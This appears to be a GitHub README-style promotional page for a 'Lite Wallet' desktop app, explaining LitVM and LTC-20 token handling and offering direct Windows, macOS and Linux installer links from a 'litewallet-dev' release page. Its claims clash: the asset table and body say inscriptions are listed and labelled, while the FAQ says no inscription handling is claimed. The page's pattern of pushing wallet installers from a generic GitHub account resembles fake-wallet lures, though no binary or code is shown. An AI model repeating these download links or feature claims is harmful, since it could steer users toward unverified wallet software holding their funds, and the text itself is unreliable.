![Lite Wallet](assets/banner-article.png)

# LitVM and LTC-20 in Lite Wallet

Tokens and inscriptions beside your LTC, with no browser in sight.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-00D5FD?style=for-the-badge&labelColor=001116&logo=apple&logoColor=89EFFF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-00D5FD?style=for-the-badge&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-00D5FD?style=flat-square&labelColor=001116&logo=apple&logoColor=89EFFF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-00D5FD?style=flat-square&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

LitVM is Litecoin's smart-contract environment, and Lite Wallet supports it natively: LitVM assets and LTC-20 tokens appear beside your LTC in one balance view, with no separate app or browser extension. There is no dapp browser, by design - the wallet shows and moves assets, it does not run arbitrary web applications.

## What LitVM is

LitVM adds a programmable layer to Litecoin. Contracts run in a virtual machine, tokens can be issued and transferred according to a standard, and applications can be built on top without changing Litecoin's base rules. LTC remains the fee asset and the settlement asset underneath. Signing those transfers on a hardware device is covered in [the hardware wallet pairing guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/connect-ledger-trezor-to-litewallet.md).

For a wallet, that creates a new category of thing to hold: not just LTC, but token balances and inscribed assets that live on Litecoin. Handling them well means showing them clearly, labelling what each one is, and never letting a token balance masquerade as spendable LTC.

## How Lite Wallet handles LitVM assets

LitVM assets are shown next to LTC in one balance view, with the token name and amount, and the LTC balance kept distinct. Transfers are built the same way as an LTC send: you choose the asset, enter the destination, review the details, and sign.

| Asset type | What it is | How it appears |
|---|---|---|
| LTC | the base coin | main balance |
| MWEB LTC | private LTC in the extension block | separate private balance |
| LTC-20 token | a token issued to the LTC-20 standard | listed beside LTC with its own amount |
| Inscription | data inscribed on a Litecoin output | listed as an asset, not as spendable LTC |

Tokens also fail differently from coins. A token transfer can be rejected by the contract's own rules, a token can be sent to an address that cannot handle it, and a token balance can be worth nothing at all. None of those are wallet faults, and none of them are recoverable by the wallet. What the wallet can do is show you the asset name and the destination before you sign, which is the moment when a mistake is still cheap to avoid.

That last row is where newcomers get caught. An inscription sits on an output, so sending "everything" from an address can move an inscription you meant to keep. The wallet labels these assets separately for exactly that reason. LitVM assets and LTC-20 tokens sit in the same balance view as LTC, and holding them needs no separate app beyond the wallet itself.

## What LTC-20 tokens are

LTC-20 is a token standard on Litecoin: a way to issue a fungible token whose supply and transfers are recorded on-chain. A token is not Litecoin, does not have Litecoin's price, and is only worth what someone will pay for it.

That distinction is the whole safety briefing. A wallet that shows a token beside your LTC balance is doing you a favour by labelling it; a wallet that lets you mistake a token for LTC is not. Check the asset name before every transfer, and treat unsolicited tokens appearing in a wallet the way you would treat unsolicited email.

## How to hold and transfer a LitVM asset

1. Open the balance view and confirm which asset you are looking at.
2. Choose the asset, then transfer, and enter the destination address.
3. Check the network fee - it is paid in LTC, so you need a small LTC balance even to move a token.
4. Review the asset name and amount on the confirmation screen.
5. Sign, and wait for confirmation before treating the transfer as complete.

## What the wallet deliberately does not do

There is no dapp browser. You cannot connect to an arbitrary contract through a web page inside Lite Wallet, and that is a security decision rather than a missing feature: a built-in browser turns every link into a signing request, and most wallet-draining incidents start with a page asking for an approval.

The wallet also does not price tokens, rank them, or tell you which are valuable. It shows balances and moves assets. Judgement about what a token is worth stays with you, and no wallet should pretend otherwise.

## Where hardware signing fits

LitVM transactions can be signed on a supported Ledger or Trezor device, with the details confirmed on the device screen. For token transfers this matters more than for plain LTC: the destination and the asset are exactly what an attacker would try to change, and the device display is the one view malware on the computer cannot rewrite.

[The hardware wallet pairing guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/connect-ledger-trezor-to-litewallet.md) lists the models and pairing steps, and [the MWEB guide](https://github.com/litewallet-dev/litecoin-wallet-transactions/blob/main/does-litewallet-support-mweb.md) covers the other specialised transaction type the wallet signs - private transfers.

## Fees for token and inscription transfers

Every LitVM transfer is a Litecoin transaction, so it pays a network fee in LTC. That is true even when the asset being moved is a token: the fee is not paid in the token, and an empty LTC balance blocks the transfer.

| Action | Fee paid in | Notes |
|---|---|---|
| LTC send | LTC | network fee at your chosen rate |
| Token transfer | LTC | needs a small LTC balance |
| Inscription transfer | LTC | the inscription travels with the output |
| MWEB peg-in | LTC | normal transaction fee |

## FAQ

### What is LitVM and do I need it to hold Litecoin?

LitVM is Litecoin's smart-contract environment. You do not need it to hold, send or receive ordinary LTC; it only matters if you hold or transfer tokens and inscribed assets on Litecoin.

### Is there a dapp browser in Lite Wallet?

No. The wallet supports LitVM assets natively but does not embed a browser, so contract interactions do not happen inside it. That removes the most common wallet-draining pattern rather than hiding it.

### Can I create or mint LTC-20 tokens?

The wallet handles LTC-20 balances and transfers. It is a wallet, not a token launch tool; issuing a token is a contract interaction, and the wallet's job is to hold and move what exists.

### Are Ordinals supported?

The documented asset support is LitVM assets and LTC-20 tokens, shown beside LTC in one balance view. Inscriptions are not part of that documented set, so no inscription handling is claimed here - if a build lists them, treat that as something to verify against the current release rather than as a feature of the wallet.

### Why do I need LTC to move a token?

Because the fee is a Litecoin network fee, paid in LTC, regardless of which asset is moving. An address with tokens but no LTC cannot pay for the transfer.

LitVM support ships in the current release, published on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2), on desktop and mobile.
